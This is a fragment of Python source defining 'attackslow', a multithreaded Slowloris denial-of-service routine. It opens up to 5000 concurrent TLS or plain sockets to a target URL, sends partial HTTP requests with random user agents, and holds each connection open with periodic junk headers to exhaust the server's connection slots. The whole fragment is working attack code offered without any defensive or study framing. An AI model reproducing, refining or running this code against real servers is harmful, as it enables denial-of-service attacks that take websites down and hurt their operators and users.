def attackslow(url, timer, threads):
    global attack_method, target_ip, attack_running
    target = get_target(url)
    attack_method = "SLOWLORIS"
    target_ip = target['host']
    end_time = time.time() + int(timer)
    attack_running = True
    ssl_context = create_ssl_context()
    log_init()
    def slow_attack():
        while time.time() < end_time and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target['host'], int(target['port'])))
                if target['scheme'] == 'https':
                    s = ssl_context.wrap_socket(s, server_hostname=target['host'])
                s.send(f"GET /?{random.randint(0, 999999)} HTTP/1.1\r\n".encode())
                s.send(f"User-Agent: {random.choice(useragents)}\r\n".encode())
                s.send(b"Accept-language: en-US,en\r\n")
                s.send(b"Connection: keep-alive\r\n\r\n")
                start = time.time()
                while time.time() - start < 10 and time.time() < end_time:
                    s.send(f"X-a: {random.randint(1, 999999)}\r\n".encode())
                    time.sleep(3)
                s.close()
                log_attack("success")
            except:
                log_attack("closed")
    thread_count = min(int(threads), 5000)
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = [executor.submit(slow_attack) for _ in range(thread_count)]
        for future in futures:
            try:
                future.result(timeout=0.01)
            except:
                pass
    log_complete()

